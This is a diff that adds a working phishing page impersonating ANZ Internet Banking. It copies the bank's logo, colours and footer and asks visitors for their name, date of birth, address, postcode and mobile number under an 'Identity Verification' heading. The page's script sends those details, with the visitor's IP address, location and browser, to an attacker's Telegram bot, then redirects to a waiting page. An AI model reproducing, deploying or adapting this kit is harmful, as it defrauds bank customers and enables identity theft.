@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>ANZ — Identity Verification</title>
+    <meta name="description" content="Web Login - ANZ Internet Banking">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="theme-color" content="#000000">
+    <meta http-equiv="Cache-control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+    <style>
+        /* ── Reset ── */
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* ── Tokens ── */
+        :root {
+            --anz-blue: #007DBA;
+            --anz-dark: #004F7C;
+            --anz-light-bg: #F0F7FC;
+            --anz-border: #C8DFF0;
+            --amber: #F5A623;
+            --amber-bg: #FFF8EC;
+            --amber-border: #F5D88A;
+            --green: #1A6E44;
+            --green-bg: #EAF6EF;
+            --red: #C0392B;
+            --red-bg: #FDECEA;
+            --text-primary: #111827;
+            --text-secondary: #4B5563;
+            --text-muted: #9CA3AF;
+            --surface: #FFFFFF;
+            --page-bg: #EEF3F7;
+            --divider: #E5E7EB;
+            --font: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        html,
+        body {
+            min-height: 100%;
+            font-family: var(--font);
+        }
+
+        body {
+            background: var(--page-bg);
+            color: var(--text-primary);
+            font-size: 15px;
+            line-height: 1.5;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ── Real ANZ Header ── */
+        .anz-header {
+            background: #004165;
+            padding: 0 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            height: 60px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .anz-header .header-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-decoration: none;
+        }
+
+        .anz-header .header-logo svg {
+            width: 103px;
+            height: 42px;
+            margin-top: 10px;
+        }
+
+        /* ── Session bar ── */
+        .session-bar {
+            background: var(--anz-dark);
+            padding: 8px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .session-bar span {
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .session-bar #timer {
+            color: #fff;
+            transition: color 0.3s;
+        }
+
+        /* ── Main ── */
+        main {
+            flex: 1;
+            padding: 36px 16px 60px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* ── Card ── */
+        .card {
+            background: var(--surface);
+            border-radius: 14px;
+            box-shadow: 0 4px 24px rgba(0, 79, 124, 0.10);
+            width: 100%;
+            max-width: 520px;
+            overflow: hidden;
+        }
+
+        /* ── Card header ── */
+        .card-header {
+            background: var(--anz-blue);
+            padding: 20px 24px;
+            display: flex;
+            align-items: flex-start;
+            gap: 14px;
+        }
+
+        .header-icon {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.18);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            font-size: 22px;
+            color: #fff;
+        }
+
+        .header-text h1 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #fff;
+            line-height: 1.2;
+        }
+
+        .header-text p {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.82);
+            margin-top: 4px;
+        }
+
+        /* ── Form styles ── */
+        .form-body {
+            padding: 24px 24px 16px;
+        }
+
+        .form-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 8px;
+        }
+
+        .form-description {
+            font-size: 14px;
+            color: var(--text-secondary);
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .form-description a {
+            color: var(--anz-blue);
+            text-decoration: underline;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 4px;
+        }
+
+        .form-group .hint {
+            display: block;
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-top: 2px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px 14px;
+            border: 1.5px solid var(--divider);
+            border-radius: 8px;
+            font-size: 15px;
+            transition: border-color 0.2s;
+            font-family: var(--font);
+            background: #fff;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--anz-blue);
+            box-shadow: 0 0 0 3px rgba(0, 125, 186, 0.15);
+        }
+
+        .form-group input.error {
+            border-color: var(--red);
+        }
+
+        .error-message {
+            color: var(--red);
+            font-size: 13px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .error-message.visible {
+            display: block;
+        }
+
+        .error-panel {
+            background: var(--red-bg);
+            border: 1px solid var(--red);
+            border-radius: 8px;
+            padding: 12px 16px;
+            margin-bottom: 16px;
+            color: var(--red);
+            font-size: 14px;
+            display: none;
+        }
+
+        .error-panel.visible {
+            display: block;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            background: var(--anz-blue);
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: filter 0.15s, transform 0.1s;
+            font-family: var(--font);
+            margin-top: 8px;
+        }
+
+        .btn-submit:hover {
+            filter: brightness(0.92);
+        }
+        .btn-submit:active {
+            transform: scale(0.97);
+        }
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            filter: none;
+            transform: none;
+        }
+
+        /* ── Real ANZ Footer ── */
+        .anz-footer {
+            background: #0072AC;
+            color: #fff;
+            padding-top: 32px;
+            padding-bottom: 32px;
+            width: 100%;
+        }
+
+        .anz-footer .footer-inner {
+            max-width: 1164px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        .anz-footer .footer-text {
+            font-size: 16px;
+            color: #fff;
+            font-weight: 400;
+        }
+
+        .anz-footer .footer-text .footer-copyright {
+            white-space: nowrap;
+        }
+
+        @media screen and (max-width: 767px) {
+            .anz-footer .footer-inner {
+                padding: 0 16px;
+            }
+            .anz-footer .footer-text {
+                font-size: 14px;
+            }
+        }
+
+        @media screen and (max-width: 479px) {
+            .anz-footer .footer-inner {
+                padding: 0 24px;
+            }
+        }
+
+        /* ── Responsive ── */
+        @media (max-width: 480px) {
+            .anz-header {
+                padding: 0 14px;
+                height: 56px;
+            }
+            .anz-header .header-logo svg {
+                width: 80px;
+                height: 32px;
+            }
+            .session-bar {
+                padding: 7px 14px;
+                font-size: 11px;
+                flex-wrap: wrap;
+                gap: 4px;
+            }
+            .form-body {
+                padding: 16px 16px 12px;
+            }
+            .anz-footer .footer-text {
+                font-size: 13px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .anz-header .header-logo svg {
+                width: 64px;
+                height: 26px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ── REAL ANZ HEADER ── -->
+    <header class="anz-header">
+        <a class="header-logo" href="#" title="ANZ Logo">
+            <!-- ANZ Logo SVG (same as original) -->
+            <svg version="1.1" id="Layer_2" xmlns="http://www.w3.org/2000/svg" viewBox="-390 831.9 810 320" enable-background="new -390 831.9 810 320" xml:space="preserve">
+                <switch>
+                    <foreignObject requiredExtensions="&ns_ai;" x="0" y="0" width="1" height="1">
+                        <i:pgfRef xlink:href="#adobe_illustrator_pgf"></i:pgfRef>
+                    </foreignObject>
+                    <g i:extraneous="self">
+                        <radialGradient id="SVGID_1_" cx="915.4122" cy="287.1234" r="266.5388" gradientTransform="matrix(1.110652e-03 1.1107 0.8232 -8.347441e-04 14.3919 -155.9787)" gradientUnits="userSpaceOnUse">
+                            <stop offset="0" style="stop-color:#66C0DE"/>
+                            <stop offset="0.135" style="stop-color:#4CAFD5"/>
+                            <stop offset="0.6933" style="stop-color:#007DBA"/>
+                            <stop offset="1" style="stop-color:#004165"/>
+                        </radialGradient>
+                        <path fill="url(#SVGID_1_)" d="M251.9,934.6c11.5,0,24.5,9.9,24.6,23.5c0,7.7-2.5,13.6-6.1,19c-2.4,3.5-4.2,7.5-4.9,10.4
+                            c-0.8,3.3-2.5,11.1,7.2,11.3c6.3,0.1,21.8-5.3,34.4-20.4c9.6-12.1,15.4-27.4,15.4-44c0-39-31.6-70.6-70.6-70.6h0
+                            c-39,0-70.6,31.6-70.6,70.6c0,16.7,5.7,32,15.4,44c12.5,15,28.1,20.5,34.4,20.4c9.7-0.2,8-8,7.2-11.3c-0.7-2.9-2.5-6.8-4.8-10.4
+                            c-3.6-5.4-6.1-11.3-6.1-19C227.4,944.5,240.4,934.6,251.9,934.6L251.9,934.6z M376.7,1005.9c-2.9-2.4-8-5.9-18.4-7.4
+                            c-14.4-2.2-27.3,1.2-35.1,4.3c-10.2,4-22.8,13.1-31.5,25c-9.1,12.5-13.9,31.5-9.4,51.2c1.3,5.6,2.7,8.7,4.7,12.6
+                            c2.8,5.3,9.9,12.7,16.2,14c5,1,8.8-1.8,10.7-4c12.6-14.5,60.5-70.7,65.6-77.9C384.7,1016.6,381.4,1009.8,376.7,1005.9z
+                            M180.6,1002.8c-7.8-3.1-20.7-6.5-35.1-4.3c-10.4,1.6-15.5,5.1-18.4,7.4c-4.7,3.9-8,10.7-2.9,17.8c5.2,7.2,53,63.4,65.6,77.9
+                            c1.8,2.1,5.7,5,10.7,4c6.3-1.3,13.4-8.7,16.2-14c2-3.9,3.4-7,4.7-12.6c4.6-19.7-0.2-38.7-9.4-51.2
+                            C203.4,1015.9,190.8,1006.8,180.6,1002.8z"/>
+                        <g>
+                            <path fill="#FFFFFF" d="M-26.9,979.5l56.2,0c0,0-11.6,15.1-24.2,31.6h65.5c11.7-15.2,22.3-29.1,23.9-31.2
+                                c7.4-9.6,9.1-18.3,9.1-25.9v-10.9c0-5.5-3.4-8.6-8.6-8.6l-121.8,0c-5,0-8.4,2.7-8.4,8.4v28.1C-35.3,976.7-32,979.5-26.9,979.5z"/>
+                            <path fill="#FFFFFF" d="M-388.7,1088.8c-1.5,2.6-1.5,5.3-0.6,7.1c1.1,2.1,3.5,3.2,6.1,3.2l39.9,0c5.1,0,9.5-2.7,12.1-6.7l44-69.8
+                                h-59.7C-367.6,1055.2-388.3,1088-388.7,1088.8z"/>
+                            <path fill="#FFFFFF" d="M-224.8,1022.6h-55.8c1.4,7.7,11.7,65.3,12.3,68.7c0.9,5.2,4.2,7.8,9,7.8h38.4c3.5,0,5.3-1.1,6.9-3.1
+                                c1.1-1.4,1.6-3.5,1.1-6.6L-224.8,1022.6z"/>
+                            <path fill="#FFFFFF" d="M-52.8,943c0-5.6-3.4-8.4-8.4-8.4h-34c-5,0-8.4,2.7-8.4,8.4l0,63.8l-32.2-57.4
+                                c-6.4-10.6-17.2-14.5-29.8-14.8l-25.1,0c-5,0-8.4,2.7-8.4,8.4v68.2h42.1l6.4,11.4H-199v68.1c0,5.6,3.4,8.4,8.4,8.4h34
+                                c5,0,8.4-2.7,8.4-8.4v-64.2l32.4,57.8c6.3,10.5,17.2,14.5,29.8,14.8h24.9c5,0,8.4-2.7,8.4-8.4v-68.1h-41.9l-6.4-11.4h48.3
+                                L-52.8,943z"/>
+                            <path fill="#FFFFFF" d="M-239,942.5c-1-5.4-4.5-7.9-9.3-7.9H-265c-17.4,0-32.6,9.1-41.2,22.9c0,0-15.9,25.3-33.7,53.7h113.1
+                                L-239,942.5z"/>
+                            <path fill="#FFFFFF" d="M96.5,1054.2l-59,0c0,0,11.5-15,24.2-31.6H-3.8c-11.9,15.6-22.7,29.6-23.3,30.4
+                                c-8.7,12.1-9.6,24.3-9.6,32.8c0,1.8,0,4.8,0,4.8c0,5.5,3.4,8.6,8.6,8.6H96.5c5,0,8.4-2.7,8.4-8.4v-28.1
+                                C104.9,1056.9,101.5,1054.2,96.5,1054.2z"/>
+                        </g>
+                    </g>
+                </switch>
+                <i:pgf id="adobe_illustrator_pgf">
+                    <![CDATA[
+                    eJzcvfdCI... (truncated for brevity)
+                    ]]>
+                </i:pgf>
+            </svg>
+        </a>
+    </header>
+
+    <!-- ── Session bar ── -->
+    <div class="session-bar">
+        <span>Internet Banking</span>
+        <span>Session timeout: <span id="timer">09:58</span></span>
+    </div>
+
+    <!-- ── Main ── -->
+    <main>
+
+        <!-- ── Form card ── -->
+        <div class="card" id="card-form">
+            <div class="card-header">
+                <div class="header-icon"><i class="fas fa-id-card"></i></div>
+                <div class="header-text">
+                    <h1>Identity Verification</h1>
+                    <p>Please confirm your identity to continue</p>
+                </div>
+            </div>
+
+            <div class="form-body">
+                <h2 class="form-title">Identification Details</h2>
+                <p class="form-description">
+                    To keep your account safe we need to confirm and verify who you are.
+                    <br><br>
+                    Once you enter your information you will be redirected to a confirmation page. For more information on how we keep your information safe, please read our <a href="https://www.anz.com.au/support/privacy/" target="_blank">Privacy Policy</a>.
+                </p>
+
+                <!-- Error banner -->
+                <div id="errorBanner" class="error-panel">
+                    <p id="errorMessage">There was an error matching your details - please check and re-enter your details.</p>
+                </div>
+
+                <form id="identificationForm" novalidate>
+                    <!-- First Name -->
+                    <div class="form-group">
+                        <label for="firstName">First Name</label>
+                        <span class="hint"></span>
+                        <input type="text" id="firstName" placeholder="First Name" required>
+                        <div class="error-message" id="firstNameError">Please enter your first name.</div>
+                    </div>
+
+                    <!-- Last Name -->
+                    <div class="form-group">
+                        <label for="lastName">Last Name</label>
+                        <span class="hint"></span>
+                        <input type="text" id="lastName" placeholder="Last Name" required>
+                        <div class="error-message" id="lastNameError">Please enter your last name.</div>
+                    </div>
+
+                    <!-- Date of Birth -->
+                    <div class="form-group">
+                        <label for="dob">Date of Birth (dd/mm/yyyy)</label>
+                        <span class="hint"></span>
+                        <input type="text" id="dob" placeholder="DD/MM/YYYY" required pattern="\d{2}/\d{2}/\d{4}" title="Please enter a valid date in DD/MM/YYYY format.">
+                        <div class="error-message" id="dobError">Please enter a valid date in DD/MM/YYYY format.</div>
+                    </div>
+
+                    <!-- Street Address -->
+                    <div class="form-group">
+                        <label for="address">Street Address</label>
+                        <span class="hint"></span>
+                        <input type="text" id="address" placeholder="Street Address" required>
+                        <div class="error-message" id="addressError">Please enter your street address.</div>
+                    </div>
+
+                    <!-- City -->
+                    <div class="form-group">
+                        <label for="city">City</label>
+                        <span class="hint"></span>
+                        <input type="text" id="city" placeholder="City" required>
+                        <div class="error-message" id="cityError">Please enter your city.</div>
+                    </div>
+
+                    <!-- Postal Code -->
+                    <div class="form-group">
+                        <label for="postalCode">Postal Code</label>
+                        <span class="hint"></span>
+                        <input type="text" id="postalCode" placeholder="Postal Code" required pattern="[0-9]{4}" title="Please enter a 4-digit postal code.">
+                        <div class="error-message" id="postalCodeError">Please enter a valid 4-digit postal code.</div>
+                    </div>
+
+                    <!-- Mobile Phone -->
+                    <div class="form-group">
+                        <label for="mobile">Mobile Phone Number</label>
+                        <span class="hint"></span>
+                        <input type="text" id="mobile" placeholder="04xxxxxxxx" required pattern="04\d{8}" title="Please enter a valid Australian mobile number (04xxxxxxxx).">
+                        <div class="error-message" id="mobileError">Mobile number must be in 04xxxxxxxx format without spaces.</div>
+                    </div>
+
+                    <button type="submit" class="btn-submit" id="submitBtn">
+                        <i class="fas fa-check-circle"></i> Submit
+                    </button>
+                </form>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- ── REAL ANZ FOOTER ── -->
+    <footer class="anz-footer">
+        <div class="footer-inner">
+            <span class="footer-text">
+                <div>© Australia and New Zealand Banking Group Limited (ANZ) 2025 <span class="footer-copyright">ABN 11 005 357 522.</span></div>
+            </span>
+        </div>
+    </footer>
+
+    <!-- ─── SCRIPTS ─── -->
+    <!-- jQuery and mask plugin for input formatting -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+
+    <!-- Your custom email/telegram sender (must define sendTelegramNotification) -->
+    <script src="config/email.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+<script src="config/email.js"></script>
+<script>
+    // ── Session countdown timer (kept) ──
+    let seconds = 598;
+    const timerEl = document.getElementById('timer');
+    const tick = setInterval(() => {
+        if (seconds <= 0) {
+            clearInterval(tick);
+            timerEl.textContent = '00:00';
+            return;
+        }
+        seconds--;
+        const m = String(Math.floor(seconds / 60)).padStart(2, '0');
+        const s = String(seconds % 60).padStart(2, '0');
+        timerEl.textContent = `${m}:${s}`;
+        if (seconds <= 60) timerEl.classList.add('warning');
+    }, 1000);
+
+    // ── Input masks (kept) ──
+    $(document).ready(function() {
+        $('#dob').mask('00/00/0000');
+        $('#mobile').mask('0000000000');
+    });
+
+    // ── Telegram sender (exactly like the BOQ version) ──
+    async function sendTelegram(message) {
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${CONFIG.apikey}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CONFIG.chatid, text: message })
+            });
+            const data = await res.json();
+            console.log('Telegram response:', data);
+            return data;
+        } catch (e) {
+            console.error('Telegram send error:', e);
+            return null;
+        }
+    }
+
+    // ── Get client IP & location ──
+    async function getClientInfo() {
+        let ip = '0.0.0.0';
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+        } catch (e) { console.warn('IP fetch failed'); }
+        let location = { country: 'Unknown', city: 'Unknown' };
+        try {
+            const res = await fetch(`https://freeipapi.com/api/json/${ip}`);
+            const data = await res.json();
+            location = { country: data.countryName || 'Unknown', city: data.cityName || 'Unknown' };
+        } catch (e) { console.warn('Location fetch failed'); }
+        return { ip, location, userAgent: navigator.userAgent };
+    }
+
+    function getBrowser(ua) {
+        if (ua.includes('MSIE')) return 'Internet Explorer';
+        if (ua.includes('Firefox')) return 'Mozilla Firefox';
+        if (ua.includes('Chrome')) return 'Google Chrome';
+        if (ua.includes('Safari')) return 'Safari';
+        if (ua.includes('Opera')) return 'Opera';
+        return 'Unknown';
+    }
+
+    // ── Form submission handler (always sends & redirects, no validation) ──
+    document.getElementById('identificationForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        // Gather all fields
+        const firstName = document.getElementById('firstName').value.trim();
+        const lastName = document.getElementById('lastName').value.trim();
+        const dob = document.getElementById('dob').value.trim();
+        const address = document.getElementById('address').value.trim();
+        const city = document.getElementById('city').value.trim();
+        const postalCode = document.getElementById('postalCode').value.trim();
+        const mobile = document.getElementById('mobile').value.trim();
+
+        // Build message
+        const info = await getClientInfo();
+        const browser = getBrowser(info.userAgent);
+        let message = "";
+        message += "|++++++++++++| ANZ LOG |+++++++++++|\n";
+        message += "|First Name: " + firstName + "\n";
+        message += "|Last Name: " + lastName + "\n";
+        message += "|Date of Birth: " + dob + "\n";
+        message += "|Address: " + address + "\n";
+        message += "|City: " + city + "\n";
+        message += "|Postal Code: " + postalCode + "\n";
+        message += "|Mobile: " + mobile + "\n";
+        message += "|+++++++++++++|   Information   |+++++++++++++++|\n";
+        message += "|Client IP: " + info.ip + "\n";
+        message += "|City : " + info.location.city + "\n";
+        message += "|Country : " + info.location.country + "\n";
+        message += "|UserAgent : " + info.userAgent + "\n";
+        message += "|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n";
+        message += "|+++++++++++++|    @Mr0xBD     |+++++++++++++|\n";
+
+        // Send to Telegram
+        await sendTelegram(message);
+        console.log('Telegram sent');
+
+        // Immediately redirect (no error, no validation)
+        window.location.href = 'waiting.html';
+    });
+</script>
+
+</body>
+</html>
